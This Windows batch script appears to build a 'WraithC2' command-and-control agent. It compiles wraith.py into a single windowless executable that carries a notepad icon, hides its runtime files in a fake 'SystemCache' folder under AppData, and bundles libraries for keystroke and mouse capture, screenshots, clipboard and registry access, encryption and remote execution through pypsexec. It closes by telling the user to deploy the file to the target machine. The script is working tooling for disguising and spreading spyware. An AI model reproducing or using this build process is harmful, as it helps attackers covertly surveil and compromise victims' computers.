@echo off
setlocal

REM â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
REM  WraithC2 Agent â€” Compiler
REM  Produces:  dist\promptflux.exe
REM             Single file, no console window, no taskbar entry.
REM  Requires:  pip install pyinstaller  (already in requirements.txt)
REM â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

set PYTHON=..\.venv\Scripts\python.exe
REM Auto-detect venv python if path above doesn't exist
if not exist "%PYTHON%" (
    set PYTHON=..\.venv\Scripts\python.exe
)
if not exist "%PYTHON%" (
    set PYTHON=python
)

echo [*] Using Python: %PYTHON%
echo [*] Installing / upgrading PyInstaller...
%PYTHON% -m pip install --quiet --upgrade pyinstaller

echo [*] Extracting icon from Windows system...
powershell -NoProfile -Command "Add-Type -AssemblyName System.Drawing; $ico=[System.Drawing.Icon]::ExtractAssociatedIcon(\"$env:SystemRoot\system32\notepad.exe\"); $fs=[System.IO.File]::OpenWrite('app_icon.ico'); $ico.Save($fs); $fs.Close(); Write-Host '[*] Icon extracted.'"

echo [*] Creating runtime temp directory...
if not exist "%APPDATA%\Microsoft\Windows\SystemCache" mkdir "%APPDATA%\Microsoft\Windows\SystemCache"
echo [*] Runtime tmpdir: %APPDATA%\Microsoft\Windows\SystemCache

echo [*] Compiling wraith.py -^> dist\promptflux.exe ...

%PYTHON% -m PyInstaller ^
    --onefile ^
    --noconsole ^
    --clean ^
    --name wraith ^
    --icon app_icon.ico ^
    --runtime-tmpdir "%%APPDATA%%\Microsoft\Windows\SystemCache" ^
    --add-data "config.py;." ^
    --hidden-import pynput ^
    --hidden-import pynput.keyboard ^
    --hidden-import pynput.mouse ^
    --hidden-import pynput._util.win32 ^
    --hidden-import PIL ^
    --hidden-import PIL.ImageGrab ^
    --hidden-import PIL.Image ^
    --hidden-import pycaw ^
    --hidden-import pycaw.pycaw ^
    --hidden-import comtypes ^
    --hidden-import comtypes.client ^
    --hidden-import win32api ^
    --hidden-import win32con ^
    --hidden-import win32clipboard ^
    --hidden-import winreg ^
    --hidden-import pythoncom ^
    --hidden-import wmi ^
    --hidden-import psutil ^
    --hidden-import Crypto ^
    --hidden-import Crypto.Cipher ^
    --hidden-import Crypto.Cipher.AES ^
    --hidden-import Crypto.Random ^
    --hidden-import pypsexec ^
    --hidden-import pypsexec.client ^
    --hidden-import requests ^
    --hidden-import sqlite3 ^
    --hidden-import winsound ^
    --exclude-module pycparser.lextab ^
    --exclude-module pycparser.yacctab ^
    --log-level ERROR ^
    wraith.py

if %ERRORLEVEL% NEQ 0 (
    echo [!] Compilation FAILED. Check output above.
    pause
    exit /b 1
)

echo.
echo [+] Done.  Output: dist\promptflux.exe
echo [+] Deploy this single file to the target machine.
echo.

REM Clean up PyInstaller build artefacts (keep dist\ only)
if exist build\          rmdir /s /q build\
if exist wraith.spec del /f /q wraith.spec
if exist app_icon.ico    del /f /q app_icon.ico

pause
